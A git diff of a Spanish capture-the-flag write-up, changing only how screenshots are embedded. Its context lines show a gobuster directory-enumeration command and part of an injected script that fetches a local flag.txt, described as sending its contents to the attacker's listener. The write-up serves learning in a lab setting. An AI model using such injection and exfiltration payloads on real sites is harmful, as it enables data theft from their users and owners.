@@ -112,7 +112,9 @@ No encontró nada, así que analizamos posibles rutas, directorios o ficheros qu
 gobuster dir -u http://10.10.218.241:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt,bak,py,sh
 ```
 
-![[Pasted image 20250102193814.png]]
+<p align="center">
+    <img src="../img/Pasted_image_20250102193814.png" width="500">
+</p>
 
 Me encuentra el fichero `flag`, por lo que para leerlo en la URL podemos la dirección `http://10.10.218.241:8080/flag.txt`
 <p align="center">
@@ -137,7 +139,9 @@ fetch('http://127.0.0.1:8080/flag.txt')
   })
 </script>
 ```
-![[Pasted image 20250102200249.png]]
+<p align="center">
+    <img src="../img/Pasted_image_20250102200249.png" width="500">
+</p>
 
 
 Si le damos al botón `Submit` y vemos el servidor que no levantamos con python podemos ver que está haciendo la petición al servidor web leyendo el fichero `flag.txt` y guardando el contenido en el parámetro `data`.
